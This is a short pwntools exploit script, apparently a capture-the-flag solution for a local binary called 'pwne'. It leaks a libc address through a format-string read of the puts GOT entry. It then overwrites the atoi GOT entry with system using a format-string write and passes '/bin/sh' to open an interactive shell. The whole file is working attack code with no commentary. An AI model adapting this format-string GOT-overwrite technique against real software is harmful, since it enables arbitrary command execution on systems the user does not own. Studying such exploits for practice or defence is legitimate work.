from pwn import *
#context.log_level = 'debug'
p = process('./pwne')
elf = ELF('pwne')

libc = ELF('/lib/i386-linux-gnu/libc.so.6')
#libc = ELF('./libc.so.6')

p.recvuntil('WANT PLAY[Y/N]')
p.sendline('Y')
p.recvuntil('GET YOUR NAME:')
p.sendline(p32(elf.got['puts'])+'%7$s')
p.recvuntil('WELCOME \n')
puts_addr = p.recv()[4:8]

system_addr = u32(puts_addr)-libc.symbols['puts']+libc.symbols['system']
atoi_got_addr = elf.got['atoi']

p.sendline('12')


p.recvuntil('WANT PLAY[Y/N]')
p.sendline('Y')
p.recvuntil('GET YOUR NAME:')
payload = fmtstr_payload(7,{atoi_got_addr:system_addr})
p.sendline(payload)
p.recvuntil('GET YOUR AGE:')
p.sendline('/bin/sh')
print payload

p.interactive()
